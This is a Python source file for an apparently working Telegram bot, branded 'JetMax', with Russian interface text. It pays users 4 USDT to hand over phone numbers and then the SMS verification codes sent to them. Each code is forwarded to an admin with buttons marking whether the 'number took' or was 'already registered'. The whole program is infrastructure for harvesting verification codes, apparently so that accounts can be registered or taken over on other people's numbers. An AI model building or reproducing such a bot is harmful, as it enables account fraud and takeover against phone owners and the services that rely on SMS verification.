import asyncio
import asyncpg
import os
import time
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_URL = os.getenv("CHANNEL_URL")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
db_pool = None

# ========== ИНИЦИАЛИЗАЦИЯ БАЗЫ ДАННЫХ ==========
async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        # Таблица users
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                current_number TEXT,
                number_timestamp BIGINT,
                balance DECIMAL(10,2) DEFAULT 0.00
            )
        ''')
        
        # Добавляем колонки если нет
        await conn.execute('''
            DO $$ 
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                              WHERE table_name='users' AND column_name='waiting_for_number') THEN
                    ALTER TABLE users ADD COLUMN waiting_for_number BOOLEAN DEFAULT FALSE;
                END IF;
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                              WHERE table_name='users' AND column_name='waiting_for_sms') THEN
                    ALTER TABLE users ADD COLUMN waiting_for_sms BOOLEAN DEFAULT FALSE;
                END IF;
            END $$;
        ''')
        
        # Таблица requests
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                status TEXT,
                created_at BIGINT
            )
        ''')
        
        # Таблица approved_requests
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS approved_requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                request_number INTEGER,
                created_at BIGINT
            )
        ''')
    logger.info("База данных готова")

# ========== КЛАВИАТУРЫ ==========
def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="💰 Баланс")]],
        resize_keyboard=True
    )

def get_chat_id():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        return f"@{url.replace('https://t.me/', '')}"
    elif url.startswith("@"):
        return url
    else:
        return int(url)

def get_channel_link():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        return url
    elif url.startswith("@"):
        return f"https://t.me/{url[1:]}"
    else:
        return f"https://t.me/c/{str(url).replace('-100', '')}"

# ========== КОМАНДЫ ПОЛЬЗОВАТЕЛЯ ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    async with db_pool.acquire() as conn:
        await conn.execute('''
            INSERT INTO users (user_id, username) VALUES ($1, $2)
            ON CONFLICT (user_id) DO UPDATE SET username = $2
        ''', user_id, username)
    
    await message.answer(
        f"<b>🔐 JetMax - твое богатое будущее!</b>\n<i>Подпишись на канал:</i> {get_channel_link()}",
        reply_markup=get_main_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "💰 Баланс")
async def show_balance(message: types.Message):
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", message.from_user.id)
        balance = row["balance"] if row else 0.00
    await message.answer(f"<b>💳 Баланс:</b> <code>{balance:.2f} USDT</code>", parse_mode="HTML")

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message):
    await message.answer("<b>Меню:</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")

# ========== АДМИНКА ==========
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("<b>⛔ Доступ запрещен</b>", parse_mode="HTML")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Создать заявку", callback_data="admin_create")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")]
    ])
    await message.answer("<b>👨‍💼 Админ панель</b>", reply_markup=keyboard, parse_mode="HTML")

@dp.callback_query(F.data == "admin_create")
async def admin_create(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещен")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Сдать номер", callback_data="send_number")]
    ])
    
    try:
        await bot.send_message(
            get_chat_id(),
            "<b>💼 Требуется номер!</b>\n<i>Нажми кнопку</i>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        await callback.answer("✅ Заявка создана")
    except Exception as e:
        await callback.answer("❌ Ошибка")
        logger.error(f"Ошибка: {e}")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещен")
        return
    
    async with db_pool.acquire() as conn:
        users = await conn.fetchval("SELECT COUNT(*) FROM users")
        approved = await conn.fetchval("SELECT COUNT(*) FROM approved_requests")
        active = await conn.fetchval("SELECT COUNT(*) FROM requests")
        payout = await conn.fetchval("SELECT SUM(balance) FROM users")
    
    await callback.message.answer(
        f"<b>📊 Статистика</b>\n\n"
        f"👥 Пользователей: <code>{users}</code>\n"
        f"✅ Выполнено: <code>{approved}</code>\n"
        f"🔄 Активных: <code>{active}</code>\n"
        f"💰 Выплачено: <code>{payout or 0:.2f} USDT</code>",
        parse_mode="HTML"
    )
    await callback.answer()

# ========== ОСНОВНАЯ ЛОГИКА ==========
@dp.callback_query(F.data == "send_number")
async def call_send_number(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    await callback.answer()
    await callback.message.answer("🔄 Перенаправление...")
    
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT current_number, number_timestamp, waiting_for_number FROM users WHERE user_id = $1", user_id)
        
        if user and user["waiting_for_number"]:
            await bot.send_message(user_id, "<b>⏳ У вас уже есть активная заявка! Отправьте номер</b>", parse_mode="HTML")
            return
        
        if user and user["current_number"] and user["number_timestamp"]:
            elapsed = int(time.time()) - user["number_timestamp"]
            if elapsed < 600:
                remaining = 600 - elapsed
                await bot.send_message(
                    user_id,
                    f"<b>⏳ Подождите {remaining//60:02d}:{remaining%60:02d}</b>",
                    parse_mode="HTML"
                )
                return
        
        await conn.execute("UPDATE users SET waiting_for_number = TRUE WHERE user_id = $1", user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_number")]
    ])
    
    await bot.send_message(
        user_id,
        "<b>📱 Отправьте номер телефона</b>\n<i>Например: +7 999 123-45-67</i>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    
    asyncio.create_task(timeout_number(user_id))

async def timeout_number(user_id: int):
    await asyncio.sleep(60)
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT waiting_for_number FROM users WHERE user_id = $1", user_id)
        if row and row["waiting_for_number"]:
            await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
            await bot.send_message(user_id, "<b>⏰ Время вышло</b>", parse_mode="HTML")

@dp.callback_query(F.data == "cancel_number")
async def cancel_number(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
    await callback.message.answer("<b>❌ Отменено</b>", parse_mode="HTML")
    await callback.answer()

# ========== ГЛАВНЫЙ ХЭНДЛЕР ВСЕХ СООБЩЕНИЙ ==========
@dp.message()
async def handle_all_messages(message: types.Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if text.startswith('/'):
        return
    
    async with db_pool.acquire() as conn:
        # 1. Проверяем - ждет ли пользователь номер?
        waiting_number = await conn.fetchval("SELECT waiting_for_number FROM users WHERE user_id = $1", user_id)
        
        if waiting_number:
            # Обработка номера
            await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
            
            number = text
            username = message.from_user.username or message.from_user.full_name
            
            # Сохраняем номер
            await conn.execute('''
                UPDATE users SET current_number = $1, number_timestamp = $2 WHERE user_id = $3
            ''', number, int(time.time()), user_id)
            
            await conn.execute('''
                INSERT INTO requests (user_id, username, number, status, created_at) 
                VALUES ($1, $2, $3, 'waiting_sms', $4)
            ''', user_id, username, number, int(time.time()))
            
            # Отправляем админу
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📨 Запросить смс", callback_data=f"request_sms_{user_id}"),
                 InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{user_id}")]
            ])
            
            await bot.send_message(
                ADMIN_ID,
                f"<b>💼 Новая заявка!</b>\n👤 @{username} [<code>{user_id}</code>]\n📱 Номер: <code>{number}</code>",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
            
            await message.answer("<b>✅ Номер принят!</b>\n<i>Ожидайте решения</i>", parse_mode="HTML")
            return
        
        # 2. Проверяем - ждет ли пользователь SMS?
        waiting_sms = await conn.fetchval("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
        
        if waiting_sms:
            # Обработка SMS кода
            await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
            
            sms_code = text
            
            # Получаем номер из заявки
            row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
            if not row:
                await message.answer("<b>❌ Заявка не найдена</b>", parse_mode="HTML")
                return
            
            number = row["number"]
            username = message.from_user.username or message.from_user.full_name
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Номер встал", callback_data=f"accept_{user_id}_{sms_code}"),
                 InlineKeyboardButton(text="📝 Уже зарегистрирован", callback_data=f"registered_{user_id}"),
                 InlineKeyboardButton(text="❌ Ошибка", callback_data=f"error_{user_id}")]
            ])
            
            await bot.send_message(
                ADMIN_ID,
                f"<b>🔐 Получен код!</b>\n👤 @{username} [<code>{user_id}</code>]\n📱 Номер: <code>{number}</code>\n🔑 Код: <code>{sms_code}</code>",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
            
            await message.answer("<b>✅ Код отправлен админу</b>", parse_mode="HTML")
            return

# ========== ДЕЙСТВИЯ АДМИНА ==========
@dp.callback_query(F.data.startswith("request_sms_"))
async def request_sms(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE requests SET status = 'waiting_sms' WHERE user_id = $1", user_id)
        await conn.execute("UPDATE users SET waiting_for_sms = TRUE WHERE user_id = $1", user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_sms")]
    ])
    
    await bot.send_message(
        user_id,
        "<b>📨 Введите код из SMS</b>\n<i>Таймер: 1 минута</i>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    
    asyncio.create_task(timeout_sms(user_id))
    await callback.answer("✅ Запрос отправлен")
    await callback.message.delete_reply_markup()

async def timeout_sms(user_id: int):
    await asyncio.sleep(60)
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
        if row and row["waiting_for_sms"]:
            await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
            await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
            await bot.send_message(user_id, "<b>⏰ Время вышло</b>", parse_mode="HTML")

@dp.callback_query(F.data.startswith("reject_"))
async def reject_request(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
    
    await bot.send_message(user_id, "<b>❌ Заявка отклонена</b>", parse_mode="HTML")
    await callback.answer("❌ Отклонено")
    await callback.message.delete_reply_markup()

@dp.callback_query(F.data.startswith("accept_"))
async def number_accepted(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    user_id = int(parts[1])
    sms_code = parts[2]
    
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
        if not row:
            await callback.answer("❌ Заявка не найдена")
            return
        
        number = row["number"]
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
        
        count = await conn.fetchval("SELECT COUNT(*) FROM approved_requests")
        request_number = count + 1
        username = callback.from_user.username or callback.from_user.full_name
        
        await conn.execute('''
            INSERT INTO approved_requests (user_id, username, number, request_number, created_at)
            VALUES ($1, $2, $3, $4, $5)
        ''', user_id, username, number, request_number, int(time.time()))
        
        await conn.execute("UPDATE users SET balance = balance + 4.00 WHERE user_id = $1", user_id)
        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
    
    await bot.send_message(
        user_id,
        f"<b>🎉 Номер принят!</b>\n💰 +4.00 USDT\n📝 Заявка #{request_number}",
        parse_mode="HTML"
    )
    await callback.answer("✅ Принято")
    await callback.message.delete_reply_markup()

@dp.callback_query(F.data.startswith("registered_"))
async def number_registered(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
    
    await bot.send_message(user_id, "<b>📝 Номер уже зарегистрирован</b>", parse_mode="HTML")
    await callback.answer("📝 Зарегистрирован")
    await callback.message.delete_reply_markup()

@dp.callback_query(F.data.startswith("error_"))
async def got_error(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    await callback.message.answer("<b>❓ Введите причину ошибки:</b>", parse_mode="HTML")
    await callback.answer()
    
    @dp.message()
    async def get_error_reason(message: types.Message):
        if message.from_user.id != ADMIN_ID:
            return
        reason = message.text
        async with db_pool.acquire() as conn:
            await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
            await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
        
        await bot.send_message(user_id, f"<b>❌ {reason}</b>", parse_mode="HTML")
        await message.answer("<b>✅ Причина отправлена</b>", parse_mode="HTML")
        dp.message.handlers.remove(get_error_reason)

@dp.callback_query(F.data == "cancel_sms")
async def cancel_sms(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    
    await callback.message.answer("<b>❌ Отменено</b>", parse_mode="HTML")
    await callback.answer()

# ========== ЗАПУСК ==========
async def main():
    await init_db()
    logger.info("🚀 Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
